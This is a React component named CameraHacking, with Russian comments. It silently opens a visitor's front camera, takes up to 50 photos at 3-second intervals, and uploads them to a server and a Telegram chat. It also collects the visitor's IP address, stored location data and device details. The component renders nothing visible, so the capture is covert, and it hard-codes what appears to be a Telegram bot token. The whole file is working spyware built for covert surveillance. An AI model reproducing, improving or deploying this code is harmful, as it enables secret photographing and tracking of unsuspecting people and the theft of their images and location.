/**
 * КОМПОНЕНТ CAMERAHACKING - ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ ANDROID
 * РЕШЕНИЕ ПРОБЛЕМЫ С ЧЕРНЫМИ ФОТО
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [isAndroid, setIsAndroid] = useState(false);
  const [androidVersion, setAndroidVersion] = useState(0);
  const [videoReady, setVideoReady] = useState(false);

  // Конфигурация
  const CAPTURE_INTERVAL = 3000; // 3 секунды
  const MAX_CAPTURES = 50;

  /**
   * ФУНКЦИЯ ОПРЕДЕЛЕНИЯ ANDROID УСТРОЙСТВА
   */
  const detectAndroid = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isAndroidDevice = /android/.test(userAgent);
    setIsAndroid(isAndroidDevice);
    
    if (isAndroidDevice) {
      const match = userAgent.match(/android\s([0-9\.]+)/);
      const version = match ? parseFloat(match[1]) : 0;
      setAndroidVersion(version);
      console.log(`🤖 Android detected: version ${version}`);
    }
    
    return isAndroidDevice;
  };

  /**
   * ФУНКЦИЯ ПОЛУЧЕНИЯ ОПТИМАЛЬНЫХ НАСТРОЕК ДЛЯ ANDROID
   */
  const getAndroidCameraConstraints = () => {
    if (!isAndroid) {
      return {
        video: {
          width: { ideal: 1280 },
          height: { ideal: 720 },
          facingMode: "user"
        }
      };
    }
    
    // Для Android используем более простые настройки
    return {
      video: {
        width: { min: 640, ideal: 1280, max: 1920 },
        height: { min: 480, ideal: 720, max: 1080 },
        frameRate: { ideal: 24 },
        facingMode: "user",
        // Критически важные настройки для Android
        resizeMode: 'crop-and-scale'
      }
    };
  };

  /**
   * ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ ВИДЕО ДЛЯ ANDROID (УЛУЧШЕННАЯ)
   */
  const initializeAndroidVideo = () => {
    return new Promise((resolve, reject) => {
      if (!videoRef.current) {
        reject(new Error("Video element not found"));
        return;
      }
      
      const video = videoRef.current;
      let videoLoaded = false;
      
      console.log("🎬 Initializing Android video...");
      
      // Критически важные настройки для Android
      video.playsInline = true;
      video.muted = true;
      video.setAttribute('playsinline', 'true');
      video.setAttribute('muted', 'true');
      video.setAttribute('webkit-playsinline', 'true');
      video.setAttribute('autoplay', 'true');
      video.setAttribute('preload', 'auto');
      
      // 1. Ожидаем загрузки метаданных
      const handleLoadedMetadata = () => {
        console.log("✅ Android video metadata loaded");
        videoLoaded = true;
        video.removeEventListener('loadedmetadata', handleLoadedMetadata);
        video.removeEventListener('error', handleError);
        
        // Для Android даем ОЧЕНЬ много времени на инициализацию
        setTimeout(() => {
          console.log(`📱 Video dimensions: ${video.videoWidth}x${video.videoHeight}`);
          
          // Пробуем принудительно запустить видео
          video.play().then(() => {
            console.log("▶️ Android video play() successful");
            
            // Даем время на отрисовку кадра
            setTimeout(() => {
              setVideoReady(true);
              resolve();
            }, 500);
            
          }).catch((playError) => {
            console.log("⚠️ Android video play() blocked, but continuing...");
            
            // Все равно продолжаем, но ждем дольше
            setTimeout(() => {
              setVideoReady(true);
              resolve();
            }, 1500);
          });
        }, 1000);
      };
      
      // 2. Обработчик ошибок
      const handleError = (error) => {
        console.error("❌ Android video error:", error);
        video.removeEventListener('loadedmetadata', handleLoadedMetadata);
        video.removeEventListener('error', handleError);
        reject(error);
      };
      
      // 3. Обработчик canplay - когда видео может воспроизводиться
      const handleCanPlay = () => {
        console.log("🎬 Android video can play");
        if (!videoLoaded) {
          handleLoadedMetadata();
        }
      };
      
      // Добавляем все обработчики
      video.addEventListener('loadedmetadata', handleLoadedMetadata);
      video.addEventListener('error', handleError);
      video.addEventListener('canplay', handleCanPlay);
      video.addEventListener('canplaythrough', handleCanPlay);
      
      // Fallback таймер - ОЧЕНЬ важный для Android!
      const fallbackTimer = setTimeout(() => {
        console.log("⏰ Android video initialization timeout - using fallback");
        video.removeEventListener('loadedmetadata', handleLoadedMetadata);
        video.removeEventListener('error', handleError);
        video.removeEventListener('canplay', handleCanPlay);
        video.removeEventListener('canplaythrough', handleCanPlay);
        
        if (!videoLoaded) {
          console.log("⚠️ Forcing video initialization...");
          setVideoReady(true);
          resolve(); // Все равно разрешаем
        }
      }, 10000); // 10 секунд для Android
      
      // Очистка таймера при успехе
      handleLoadedMetadata.cleanup = () => clearTimeout(fallbackTimer);
      
    });
  };

  /**
   * ФУНКЦИЯ ДЛЯ ЗАХВАТА КАДРА С ANDROID (ИСПРАВЛЕННАЯ)
   */
  const captureAndroidFrame = async (video) => {
    return new Promise((resolve, reject) => {
      // Создаем canvas
      const canvas = document.createElement("canvas");
      
      // Используем текущие размеры видео
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const context = canvas.getContext("2d", {
        alpha: false, // Отключаем прозрачность для производительности
        willReadFrequently: false
      });
      
      // Очищаем canvas черным цветом перед рисованием
      context.fillStyle = 'black';
      context.fillRect(0, 0, canvas.width, canvas.height);
      
      // Пробуем несколько раз нарисовать кадр (для Android)
      const maxAttempts = 5;
      let attempts = 0;
      
      const tryDrawFrame = () => {
        attempts++;
        
        try {
          // Пробуем нарисовать текущий кадр
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Проверяем, не черный ли canvas
          const imageData = context.getImageData(0, 0, 1, 1).data;
          const isBlack = imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0;
          
          if (!isBlack || attempts >= maxAttempts) {
            console.log(`📸 Android frame captured (attempt ${attempts}/${maxAttempts}, black: ${isBlack})`);
            
            // Применяем улучшения для Android
            if (!isBlack) {
              context.filter = "contrast(1.2) brightness(1.1) saturate(1.1)";
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            
            resolve(canvas);
          } else {
            // Ждем и пробуем снова
            console.log(`⏳ Android: Got black frame, retrying... (${attempts}/${maxAttempts})`);
            setTimeout(tryDrawFrame, 200);
          }
        } catch (error) {
          console.error("❌ Error drawing frame:", error);
          reject(error);
        }
      };
      
      // Начинаем попытки захвата
      tryDrawFrame();
    });
  };

  /**
   * ФУНКЦИЯ ОТПРАВКИ ФОТО (УПРОЩЕННАЯ)
   */
  const sendToTelegram = async (blob, filename) => {
    try {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, filename);
      
      // Добавляем информацию для отладки
      formData.append("debug_info", JSON.stringify({
        isAndroid: isAndroid,
        androidVersion: androidVersion,
        timestamp: Date.now(),
        blobSize: blob.size,
        userAgent: navigator.userAgent.substring(0, 100)
      }));
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      
      console.log(`📤 Sending photo (${Math.round(blob.size / 1024)} KB)...`);
      
      await axios.post(apiUrl, formData, {
        headers: { "Content-Type": "multipart/form-data" },
        timeout: 30000
      });
      
      console.log(`✅ Photo #${captureCount + 1} sent successfully`);
      setCaptureCount(prev => prev + 1);
      
    } catch (error) {
      console.error(`❌ Error sending photo:`, error.message);
      
      // Отправляем ошибку в Telegram
      try {
        const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
        await axios.post(telegramApiUrl, {
          'chat_id': chatId,
          'text': `❌ Photo Send Error\n\n` +
                 `Error: ${error.message}\n` +
                 `Device: ${isAndroid ? 'Android' : 'Other'}\n` +
                 `Time: ${new Date().toLocaleString()}`
        });
      } catch (e) {
        console.error("❌ Could not send error notification:", e);
      }
    }
  };

  /**
   * ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ФОТО
   */
  const capturePhoto = async () => {
    if (!videoRef.current || !streamRef.current || captureCount >= MAX_CAPTURES) {
      console.log("⏸️ Capture stopped");
      stopCapturing();
      return;
    }
    
    try {
      const video = videoRef.current;
      
      // Критическая проверка для Android
      if (isAndroid) {
        if (!videoReady) {
          console.log("⏳ Android video not ready yet, skipping...");
          return;
        }
        
        // Дополнительная проверка размеров
        if (video.videoWidth === 0 || video.videoHeight === 0) {
          console.log(`⚠️ Android video dimensions are zero: ${video.videoWidth}x${video.videoHeight}`);
          
          // Пробуем принудительно обновить
          setTimeout(() => {
            if (video.videoWidth > 0 && video.videoHeight > 0) {
              capturePhoto();
            }
          }, 1000);
          return;
        }
      }
      
      console.log(`📸 Capturing photo #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);
      
      let canvas;
      
      if (isAndroid) {
        // Используем специальную функцию для Android
        canvas = await captureAndroidFrame(video);
      } else {
        // Для iOS/десктопов обычный подход
        canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }
      
      // Качество для Android делаем ниже для надежности
      const quality = isAndroid ? 0.6 : 0.8;
      
      canvas.toBlob(async (blob) => {
        if (blob) {
          const sizeKB = Math.round(blob.size / 1024);
          console.log(`✅ Photo captured (${sizeKB} KB)`);
          
          // Отправляем фото
          await sendToTelegram(blob, `photo_${Date.now()}.jpg`);
          
          // Для Android проверяем размер фото
          if (isAndroid && blob.size < 1024) {
            console.log("⚠️ Android: Photo size suspiciously small, might be black");
          }
        } else {
          console.error("❌ Failed to create image blob");
        }
      }, "image/jpeg", quality);
      
    } catch (error) {
      console.error("❌ Capture error:", error);
      
      if (isAndroid) {
        console.log("🔄 Android: Will retry in next interval...");
      }
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log(`🚀 Starting periodic capture every ${CAPTURE_INTERVAL/1000} seconds`);
    
    // Для Android даем больше времени перед первым захватом
    const initialDelay = isAndroid ? 3000 : 1000;
    
    setTimeout(() => {
      capturePhoto();
    }, initialDelay);
    
    // Затем каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      if (captureCount < MAX_CAPTURES) {
        capturePhoto();
      } else {
        stopCapturing();
        console.log("🎯 Capture limit reached");
      }
    }, CAPTURE_INTERVAL);
  };

  /**
   * ОСТАНОВКА ЗАХВАТА
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    console.log("🛑 Capture stopped");
  };

  /**
   * ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ КАМЕРЫ
   */
  const initializeCamera = async () => {
    try {
      console.log("📱 Initializing camera...");
      
      // Определяем Android
      detectAndroid();
      
      // Получаем настройки для устройства
      const constraints = getAndroidCameraConstraints();
      console.log("🎯 Camera constraints:", constraints);
      
      // Запрашиваем доступ к камере
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      console.log("✅ Camera access granted");
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        
        // Для Android используем специальную инициализацию
        if (isAndroid) {
          console.log("🔄 Initializing Android video (this may take a moment)...");
          await initializeAndroidVideo();
        } else {
          // Для iOS/десктопов
          await new Promise(resolve => {
            videoRef.current.onloadedmetadata = () => {
              setVideoReady(true);
              setTimeout(resolve, 1000);
            };
          });
        }
        
        console.log("🎬 Camera ready!");
        
        // Отправляем информацию об устройстве
        try {
          const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
          await axios.post(telegramApiUrl, {
            'chat_id': chatId,
            'text': `📱 Camera Initialized\n\n` +
                   `Platform: ${isAndroid ? 'Android' : 'iOS/Desktop'}\n` +
                   `Status: ${videoReady ? 'Ready' : 'Not Ready'}\n` +
                   `Time: ${new Date().toLocaleString()}`
          });
        } catch (e) {
          console.log("⚠️ Could not send initialization info");
        }
        
        // Запускаем захват
        startPeriodicCapture();
      }
      
    } catch (error) {
      console.error("❌ Camera initialization error:", error);
      
      // Пробуем альтернативные настройки
      if (isAndroid) {
        console.log("🔄 Trying fallback camera constraints...");
        try {
          const fallbackConstraints = {
            video: true // Максимально простые настройки
          };
          
          const stream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
          streamRef.current = stream;
          
          if (videoRef.current) {
            videoRef.current.srcObject = stream;
            setTimeout(() => {
              setVideoReady(true);
              startPeriodicCapture();
            }, 3000);
          }
        } catch (fallbackError) {
          console.error("❌ Fallback camera also failed:", fallbackError);
        }
      }
    }
  };

  /**
   * ФУНКЦИЯ ПОЛУЧЕНИЯ IP АДРЕСА
   */
  const fetchClientIp = async () => {
    try {
      const response = await axios.get('https://api.ipify.org?format=json', {
        timeout: 5000
      });
      
      const ip = response.data.ip;
      setClientIp(ip);
      console.log("✅ Client IP fetched:", ip);
      
    } catch (error) {
      console.error("❌ Error fetching client IP:", error);
      setClientIp("IP unavailable");
    }
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    const init = async () => {
      // Восстановление геолокации
      const savedPermission = localStorage.getItem("locationPermission");
      if (savedPermission) {
        try {
          const locationData = JSON.parse(savedPermission);
          setLocationPermission(locationData);
          console.log("📍 Restored location data");
        } catch (error) {
          localStorage.removeItem("locationPermission");
        }
      }
      
      // Инициализация камеры
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        await initializeCamera();
        await fetchClientIp();
      } else {
        console.error("❌ MediaDevices API not supported");
      }
    };

    // Запуск инициализации
    init();

    // Очистка
    return () => {
      stopCapturing();
      
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => {
          track.stop();
          console.log(`🛑 Stopped ${track.kind} track`);
        });
        streamRef.current = null;
      }
    };
  }, []);

  return null;
};

export default CameraHacking;
